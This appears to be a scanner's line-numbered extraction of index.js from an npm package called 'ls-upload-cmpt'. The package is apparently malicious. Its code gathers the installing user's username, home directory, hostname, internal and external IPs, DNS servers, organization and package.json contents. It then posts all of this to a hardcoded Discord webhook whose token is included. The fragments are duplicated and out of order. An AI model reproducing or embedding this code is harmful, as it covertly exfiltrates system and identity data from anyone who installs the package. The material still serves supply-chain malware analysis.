// File: tmp/tmpm63t8pdl/ls-upload-cmpt/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: const packageJSON = require("./package.json")
Line 11: for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
Line 12: const iface = networkInterfaces[interfaceName]
Line 13: _iterator_1.next()
Line 24: (_tmp_0 = https.get('https://ipinfo.io/json', (res) => {
        let data = '';

        // Receive data chunks
        res.on('data', (chunk) => {
            data += chunk;
        });

        // On response end, parse and return the IP address
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org}); // Call the callback with the external IP address
        });
    }))
Line 34: const parsedData = JSON.parse(data)
Line 35: callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org})
Line 39: callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'})
Line 44: {
    const trackingData = JSON.stringify({
        package: package,
        directory: __dirname,
        home_directory: os.homedir(),
        username: os.userInfo().username,
        dns: dns.getServers(),
        internal_hostname: os.hostname(),
        internal_ip: getIPAddress(), // Add internal IP address here
        external_ip: externalIP.ip, // Get External IP Address
        external_hostname: externalIP.hostname,
        organization: externalIP.organization,
        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
        package_version: packageJSON.version,
        package_json: packageJSON,
        package_type: 'npm',
    });

    const webhookURL = "https://discord.com/api/webhooks/1306068586086793297/5ERJ-0yumqHWIUMiaww5_SdUkVAptuIxMIUMbTaEY--c5IyIDDA4aYHdKIi6YwYJ_7mS"; // Replace with your Discord webhook URL

    const postData = JSON.stringify({
        content: `\`\`\`json\n${trackingData}\n\`\`\`` // Wrap the tracking data in a code block ...
Line 49: os.userInfo()
Line 51: os.hostname()
Line 52: getIPAddress()
Line 62: const webhookURL = "https://discord.com/api/webhooks/1306068586086793297/5ERJ-0yumqHWIUMiaww5_SdUkVAptuIxMIUMbTaEY--c5IyIDDA4aYHdKIi6YwYJ_7mS"
Line 76: const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    })
Line 77: {
            process.stdout.write(d);
        }
Line 78: process.stdout.write(d)
Line 86: req.write(postData)
Line 87: req.end()
